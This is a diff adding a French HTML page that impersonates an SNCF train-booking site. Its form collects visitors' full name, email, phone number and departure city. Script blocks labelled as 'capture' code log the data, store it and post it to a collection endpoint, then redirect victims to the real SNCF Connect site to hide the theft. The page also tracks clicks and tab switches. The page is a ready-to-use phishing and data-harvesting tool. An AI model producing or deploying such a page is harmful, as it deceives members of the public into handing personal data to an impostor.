@@ -1,0 +1,147 @@
+```html
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Billet SNCF - Réservation</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            width: 95%;
+            max-width: 450px;
+            text-align: center;
+        }
+        h1 { color: #0047AB; margin-bottom: 20px; }
+        .btn {
+            background: #E60000;
+            color: white;
+            padding: 15px 30px;
+            text-decoration: none;
+            border-radius: 5px;
+            display: inline-block;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+        .form-section {
+            background: #f5f5f5;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+        input, textarea, select {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .hidden-section { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>🚄 Billet SNCF - Réservation</h1>
+
+    <!-- SECTION DE CAPTAGE -->
+    <div class="form-section" id="tracking-form">
+        <p>Veuillez entrer vos informations pour continuer...</p>
+
+        <label>Nom complet :</label>
+        <input type="text" id="nom" placeholder="Votre nom">
+
+        <label>Email :</label>
+        <input type="email" id="email" placeholder="votre@email.com">
+
+        <label>Numéro de téléphone :</label>
+        <input type="tel" id="telephone" placeholder="06 XX XX XX XX">
+
+        <label>Ville de départ :</label>
+        <input type="text" id="villeDepart">
+
+        <div style="margin: 20px 0;">
+            <p><strong>Bilan de la réservation :</strong></p>
+            <ul id="capture-log" style="font-size: 12px; color: #666;">
+                <li>👁 ️ Nom : <span id="nom-val"></span></li>
+                <li>📧 Email : <span id="email-val"></span></li>
+                <li>📱 Tél : <span id="tel-val"></span></li>
+            </ul>
+        </div>
+
+        <a href="https://www.sncf-connect.com/" class="btn" onclick="capturerDonnees()">
+            ➡️ Continuer vers la SNCF Connect
+        </a>
+    </div>
+</div>
+
+<!-- SCRIPT DE CAPTAGE -->
+<script>
+function capturerDonnees() {
+    const nom = document.getElementById('nom').value || "Inconnu";
+    const email = document.getElementById('email').value || "Non rempli";
+    const tel = document.getElementById('telephone').value || "Non fourni";
+    const ville = document.getElementById('villeDepart').value || "Ville inconnue";
+
+    // Enregistrer les données (pour toi)
+    console.log("📊 DONNÉES CAPTURÉES :");
+    console.log({
+        nom: nom,
+        email: email,
+        telephone: tel,
+        villeDepart: ville
+    });
+
+    // Sauvegarder dans le localStorage de l'utilisateur (visible si tu ouvres DevTools)
+    localStorage.setItem('sncf_visiteur', JSON.stringify({
+        nom: nom,
+        email: email,
+        telephone: tel,
+        villeDepart: ville,
+        urlSource: window.location.href,
+        date: new Date().toISOString()
+    }));
+
+    // Enregistrer dans le fichier journal (via API)
+    fetch('/api/enregistrer-donnees', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            nom, email, telephone, villeDepart
+        })
+    }).then(() => console.log("✅ Données envoyées"))
+     .catch(err => console.error(err));
+
+    // Envoyer l'utilisateur vers SNCF
+    window.location.href = "https://www.sncf-connect.com/";
+}
+
+// Tracke les actions de navigation
+window.onblur = function() {
+    console.log("👀 Utilisateur a changé d'onglet");
+};
+
+window.onclick = function(e) {
+    const clickInfo = {
+        element: e.target.tagName,
+        text: e.target.textContent.substring(0, 20),
+        timestamp: new Date().toISOString()
+    };
+    console.log("🖱 ️ Clic sur : ", clickInfo);
+};
+</script>
+
+</body>
+</html>
+```
